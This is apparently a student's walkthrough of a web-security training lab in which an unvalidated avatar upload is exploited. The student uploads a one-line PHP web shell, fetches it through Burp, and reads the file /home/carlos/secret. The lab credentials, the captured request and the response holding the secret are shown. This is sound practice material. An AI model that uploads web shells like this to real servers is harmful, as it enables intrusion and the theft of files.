*This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner. You can log in to your own account using the following credentials: wiener:peter *

I created my exploit file as follows : 
```php 
echo file_get_contents('/home/carlos/secret');
```

Logged in with the given credentials, receiving this page when I clicked on *My account*. 

![[Screenshot 2024-04-30 at 7.15.49 PM.png]]

I uploaded a file and observed the requests made through Burp Intercept. Uploading the file will direct me to this page: 

![[Screenshot 2024-04-30 at 7.19.43 PM.png]]

Heading back to my account will trigger this intercept, where the server fetches my 'image' from the following directory: 
```Burp 
GET /files/avatars/exploit.php HTTP/2
Host: 0a59001f03aae38d81a88409008f002d.web-security-academy.net
Cookie: session=BWQ4BMNXY1INXrXc3cUEYajLQ8HOHMIU
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: image/avif,image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a59001f03aae38d81a88409008f002d.web-security-academy.net/my-account
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Te: trailers
```
I decided to send this to the Repeater and see the response I would get. I got the following, along with the secret: 
```Burp 
HTTP/2 200 OK
Date: Tue, 30 Apr 2024 11:27:28 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32

xGokTf663mdi8wx85J0lXZQibwWvBBzc
```
